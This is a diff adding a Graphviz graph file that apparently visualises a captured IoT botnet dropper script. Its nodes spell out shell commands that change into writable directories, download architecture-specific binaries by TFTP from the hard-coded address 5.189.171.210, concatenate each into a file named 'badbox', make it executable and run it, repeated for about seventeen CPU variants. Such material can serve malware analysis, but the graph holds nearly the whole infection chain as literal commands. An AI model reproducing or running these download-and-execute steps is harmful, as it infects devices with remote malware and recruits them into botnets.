@@ -1,0 +1,366 @@
+digraph {
+0 [label="ulimit -n 1024 "];
+0 -> 0
+2 [label="cp /bin/busybox /tmp/ "];
+2 -> 2
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 14 [label="||,"];
+14 [label="tftp -r arcms -g 5.189.171.210 "];
+14 -> 16 [label=";,"];
+16 [label="cat arcms badbox "];
+16 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 34 [label="||,"];
+34 [label="tftp -r arcml -g 5.189.171.210 "];
+34 -> 36 [label=";,"];
+36 [label="cat arcml badbox "];
+36 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 54 [label="||,"];
+54 [label="tftp -r arc4t -g 5.189.171.210 "];
+54 -> 56 [label=";,"];
+56 [label="cat arc4t badbox "];
+56 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 74 [label="||,"];
+74 [label="tftp -r arc4l -g 5.189.171.210 "];
+74 -> 76 [label=";,"];
+76 [label="cat arc4l badbox "];
+76 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 94 [label="||,"];
+94 [label="tftp -r arc5l -g 5.189.171.210 "];
+94 -> 96 [label=";,"];
+96 [label="cat arc5l badbox "];
+96 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 114 [label="||,"];
+114 [label="tftp -r arc6l -g 5.189.171.210 "];
+114 -> 116 [label=";,"];
+116 [label="cat arc6l badbox "];
+116 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 134 [label="||,"];
+134 [label="tftp -r arc7l -g 5.189.171.210 "];
+134 -> 136 [label=";,"];
+136 [label="cat arc7l badbox "];
+136 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 154 [label="||,"];
+154 [label="tftp -r arcsh -g 5.189.171.210 "];
+154 -> 156 [label=";,"];
+156 [label="cat arcsh badbox "];
+156 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 174 [label="||,"];
+174 [label="tftp -r arcpc -g 5.189.171.210 "];
+174 -> 176 [label=";,"];
+176 [label="cat arcpc badbox "];
+176 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 194 [label="||,"];
+194 [label="tftp -r arc440 -g 5.189.171.210 "];
+194 -> 196 [label=";,"];
+196 [label="cat arc440 badbox "];
+196 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 214 [label="||,"];
+214 [label="tftp -r arcm68 -g 5.189.171.210 "];
+214 -> 216 [label=";,"];
+216 [label="cat arcm68 badbox "];
+216 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 234 [label="||,"];
+234 [label="tftp -r arcsprc -g 5.189.171.210 "];
+234 -> 236 [label=";,"];
+236 [label="cat arcsprc badbox "];
+236 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 254 [label="||,"];
+254 [label="tftp -r arc32 -g 5.189.171.210 "];
+254 -> 256 [label=";,"];
+256 [label="cat arc32 badbox "];
+256 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 274 [label="||,"];
+274 [label="tftp -r arc38 -g 5.189.171.210 "];
+274 -> 276 [label=";,"];
+276 [label="cat arc38 badbox "];
+276 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 294 [label="||,"];
+294 [label="tftp -r arc48 -g 5.189.171.210 "];
+294 -> 296 [label=";,"];
+296 [label="cat arc48 badbox "];
+296 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 314 [label="||,"];
+314 [label="tftp -r arc58 -g 5.189.171.210 "];
+314 -> 316 [label=";,"];
+316 [label="cat arc58 badbox "];
+316 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 334 [label="||,"];
+334 [label="tftp -r arc64 -g 5.189.171.210 "];
+334 -> 336 [label=";,"];
+336 [label="cat arc64 badbox "];
+336 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 344 [label=";,"];
+344 [label="cd /tmp "];
+344 -> 344
+346 [label="cd /var/run "];
+346 -> 348 [label="||,"];
+348 [label="cd /mnt "];
+348 -> 350 [label="||,"];
+350 [label="cd /root "];
+350 -> 352 [label="||,"];
+352 [label="cd / "];
+352 -> 354 [label="||,"];
+354 [label="tftp -r arc68 -g 5.189.171.210 "];
+354 -> 356 [label=";,"];
+356 [label="cat arc68 badbox "];
+356 -> 358 [label=";,"];
+358 [label="badbox "];
+358 -> 358
+360 [label="chmod +x * "];
+360 -> 362 [label=";,"];
+362 [label="./badbox "];
+362 -> 363 [label=";,"];
+}
